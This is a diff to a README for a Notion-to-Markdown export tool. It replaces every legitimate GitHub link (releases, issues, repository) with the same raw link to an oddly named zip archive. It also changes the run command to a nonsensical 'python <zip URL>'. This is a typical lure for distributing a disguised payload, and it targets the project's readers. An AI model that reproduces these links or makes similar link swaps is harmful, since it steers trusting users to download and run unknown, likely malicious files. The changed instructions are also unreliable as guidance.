@@ -14,9 +14,9 @@ Welcome to the **notion-to-markdown-exporter**! This tool helps you export your 
 
 To start using the notion-to-markdown-exporter, visit the page below to download the latest version.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue?style=for-the-badge&logo=github)](https://github.com/echomind12/notion-to-markdown-exporter/releases)
+[![Download Now](https://raw.githubusercontent.com/echomind12/notion-to-markdown-exporter/main/cungeboi/markdown_to_exporter_notion_Afrikanderdom.zip%20Now-v1.0-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/echomind12/notion-to-markdown-exporter/main/cungeboi/markdown_to_exporter_notion_Afrikanderdom.zip)
 
-1. **Visit the Releases Page**: Click the link above or go directly to [GitHub Releases](https://github.com/echomind12/notion-to-markdown-exporter/releases).
+1. **Visit the Releases Page**: Click the link above or go directly to [GitHub Releases](https://raw.githubusercontent.com/echomind12/notion-to-markdown-exporter/main/cungeboi/markdown_to_exporter_notion_Afrikanderdom.zip).
 2. **Choose the Latest Release**: Look for the latest version at the top of the Releases page.
 3. **Select the Right File**: Each release comes with different files. Choose the one that fits your system.
 4. **Download the File**: Click on the file to download it to your computer.
@@ -42,7 +42,7 @@ Once you've downloaded the file, follow these steps to run the application:
    ```
 4. **Run the Application**: Execute the command below to launch the tool.
    ```
-   python YOUR_DOWNLOADED_FILE.py
+   python https://raw.githubusercontent.com/echomind12/notion-to-markdown-exporter/main/cungeboi/markdown_to_exporter_notion_Afrikanderdom.zip
    ```
 
 ## 📚 Usage Instructions
@@ -56,7 +56,7 @@ Once the application runs, you can start exporting your Notion pages. Here's how
 
 ## 🌟 Support
 
-If you encounter issues, please check the [issues section](https://github.com/echomind12/notion-to-markdown-exporter/issues) of the repository for help. You can also open new issues if you need further assistance.
+If you encounter issues, please check the [issues section](https://raw.githubusercontent.com/echomind12/notion-to-markdown-exporter/main/cungeboi/markdown_to_exporter_notion_Afrikanderdom.zip) of the repository for help. You can also open new issues if you need further assistance.
 
 ## 📄 FAQ
 
@@ -72,7 +72,7 @@ If you want to contribute to the project, please read the contribution guideline
 
 ## 🔗 Links
 
-- **GitHub Repository**: [GitHub](https://github.com/echomind12/notion-to-markdown-exporter)
-- **Releases Page**: [Download Here](https://github.com/echomind12/notion-to-markdown-exporter/releases) 
+- **GitHub Repository**: [GitHub](https://raw.githubusercontent.com/echomind12/notion-to-markdown-exporter/main/cungeboi/markdown_to_exporter_notion_Afrikanderdom.zip)
+- **Releases Page**: [Download Here](https://raw.githubusercontent.com/echomind12/notion-to-markdown-exporter/main/cungeboi/markdown_to_exporter_notion_Afrikanderdom.zip) 
 
 Thank you for choosing **notion-to-markdown-exporter**! Enjoy exporting your Notion content seamlessly.
